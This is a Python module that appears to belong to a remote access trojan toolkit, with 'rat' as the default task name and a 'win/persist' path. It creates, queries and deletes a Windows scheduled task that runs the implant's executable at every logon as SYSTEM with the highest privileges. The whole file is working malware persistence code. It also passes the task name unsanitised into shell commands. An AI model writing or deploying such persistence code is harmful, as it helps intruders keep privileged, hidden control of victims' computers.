import subprocess

from core.utils.client_util import get_executable_path

# 默认配置
DEFAULT_NAME = 'rat'
EXECUTABLE_PATH = get_executable_path()


def schtasks(action, name):
    if action == 'help':
        print('\n' + '=' * 50)
        print('Scheduled Task Persistence Script')
        print('=' * 50)
        print('\nUsage:')
        print('  --action create               Create scheduled task (default name: rat)')
        print('  --action delete               Delete scheduled task (default name: rat)')
        print('  --action query                Check if task exists (default name: rat)')
        print('  --action query --name MyTask  Check specific task')
        print('  --action create --name MyTask Create with custom name')
        print('  --action delete --name MyTask Delete with custom name')
        print('\nExamples:')
        print('  exec win/persist/schtasks.py --action create')
        print('  exec win/persist/schtasks.py --action query --name MyTask')
        print('  exec win/persist/schtasks.py --action delete --name MyTask')
        print('=' * 50)
        return

    if action == 'query':
        result = subprocess.run(f'schtasks.exe /query /tn "{name}"', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f'✓ Scheduled task "{name}" exists')
            result = subprocess.run(f'schtasks.exe /query /tn "{name}" /fo LIST', shell=True, capture_output=True,
                                    text=True)
            for line in result.stdout.splitlines():
                if line.strip():
                    print(f'  {line.strip()}')
        else:
            print(f'✗ Scheduled task "{name}" does not exist')
        return

    if action == 'delete':
        result = subprocess.run(f'schtasks.exe /delete /tn "{name}" /f', shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f'✓ Scheduled task "{name}" removed')
        else:
            print(f'✗ Failed to remove scheduled task "{name}": {result.stderr.strip()}')
        return

    if action == 'create':
        cmd = f'schtasks.exe /create /tn "{name}" /sc onlogon /ru system /rl highest /tr "{EXECUTABLE_PATH}" /f'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f'✓ Scheduled task "{name}" created')
            print(f'  Trigger: At log on')
            print(f'  Run as: SYSTEM')
            print(f'  Action: {EXECUTABLE_PATH}')
        else:
            print(f'✗ Failed to create scheduled task: {result.stderr.strip()}')
        return

    print(f'Unknown action: {action}')


action = kwargs.get('action', 'help')
name = kwargs.get('name', DEFAULT_NAME)
schtasks(action=action, name=name)
